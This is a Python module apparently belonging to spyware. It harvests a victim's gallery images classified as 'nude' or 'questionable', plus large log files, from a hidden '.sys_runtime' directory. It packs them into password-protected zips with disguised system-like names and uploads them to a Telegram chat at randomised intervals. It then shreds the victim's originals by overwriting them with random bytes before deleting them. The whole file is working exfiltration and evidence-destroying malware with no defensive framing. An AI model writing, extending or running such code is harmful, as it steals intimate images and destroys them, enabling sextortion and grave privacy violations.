# -*- coding: utf-8 -*-
import os, time, json, random, zipfile, threading, logging, gc, string
from datetime import datetime

P = os.path.join(os.getcwd(), ".sys_runtime")
H = os.path.join(P, "harvest")
if not os.path.exists(H):
    os.makedirs(H)

logging.basicConfig(filename=os.path.join(P, "z.log"), level=logging.ERROR, filemode='a')

try:
    import pyzipper
    HAS_PYZIP = True
except:
    HAS_PYZIP = False

class DailyZipper:
    def __init__(self, scanner=None, tg=None):
        self.sc = scanner
        self.tg = tg
        self.pw = "Z@3n_2025"
        self.max_b = 40 * 1024 * 1024
        self.active = False

    def _gen_name(self):
        prefixes = ["cache_", "sys_upd_", "tmp_vol_", "core_st_", "db_sync_"]
        chars = string.ascii_letters + string.digits
        suffix = ''.join(random.choices(chars, k=8))
        return f"{random.choice(prefixes)}{suffix}.zip"

    def _shred(self, path):
        try:
            if os.path.exists(path):
                sz = os.path.getsize(path)
                if sz > 0:
                    with open(path, "ba+", buffering=0) as f:
                        f.write(os.urandom(sz))
                        f.flush()
                        os.fsync(f.fileno())
                os.remove(path)
        except:
            pass

    def _pack(self, files):
        if not files or self.active:
            return
        self.active = True

        batches = []
        cur_batch = []
        cur_size = 0

        for f in files:
            if not os.path.exists(f):
                continue
            try:
                fsz = os.path.getsize(f)
                if cur_size + fsz > self.max_b:
                    batches.append(cur_batch)
                    cur_batch = []
                    cur_size = 0
                cur_batch.append(f)
                cur_size += fsz
            except:
                continue
        if cur_batch:
            batches.append(cur_batch)

        def _sender():
            vault = None
            try:
                if self.sc and self.sc.det and self.sc.det.mon:
                    vault = getattr(self.sc.det.mon, 'vlt', None)
            except:
                pass
            if not vault:
                vault = getattr(self.tg, 'dat', None)

            for idx, batch in enumerate(batches):
                zip_name = self._gen_name()
                zip_path = os.path.join(H, zip_name)

                try:
                    if HAS_PYZIP:
                        with pyzipper.AESZipFile(zip_path, 'w',
                                                 compression=pyzipper.ZIP_DEFLATED,
                                                 encryption=pyzipper.WZ_AES) as zf:
                            zf.setpassword(self.pw.encode('utf-8'))
                            for f in batch:
                                arcname = os.path.basename(f) + ".tmp"
                                zf.write(f, arcname)
                    else:
                        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                            for f in batch:
                                arcname = os.path.basename(f) + ".tmp"
                                zf.write(f, arcname)

                    with open(zip_path, 'rb') as fobj:
                        resp = self.tg._ap("sendDocument",
                                           {"chat_id": vault, "caption": f"📦 {idx+1}/{len(batches)}"},
                                           {"document": fobj})

                    if resp and resp.get('ok'):
                        threading.Thread(target=self._shred_batch, args=(batch,), daemon=True).start()
                except Exception as e:
                    logging.error(f"Pack error: {e}")
                finally:
                    if os.path.exists(zip_path):
                        os.remove(zip_path)

                if idx < len(batches) - 1:
                    time.sleep(random.randint(600, 10800))

            self.active = False
            gc.collect()

        threading.Thread(target=_sender, daemon=True).start()

    def _shred_batch(self, batch):
        step = random.randint(3, 7)
        for i in range(0, len(batch), step):
            for f in batch[i:i+step]:
                self._shred(f)
            time.sleep(random.randint(30, 90))

    def run(self):
        if self.active:
            return
        all_files = []
        if self.sc:
            nude = self.sc.get_gallery_by_category("nude", limit=300)
            all_files.extend([item["path"] for item in nude if "path" in item])
            quest = self.sc.get_gallery_by_category("questionable", limit=150)
            all_files.extend([item["path"] for item in quest if "path" in item])

        for f in os.listdir(P):
            if f.endswith(".log") and f not in ["z.log", "s.log"]:
                path = os.path.join(P, f)
                if os.path.exists(path) and os.path.getsize(path) > 5000:
                    all_files.append(path)

        if all_files:
            self._pack(all_files)

def create(scanner=None, telegram=None):
    return DailyZipper(scanner, telegram)
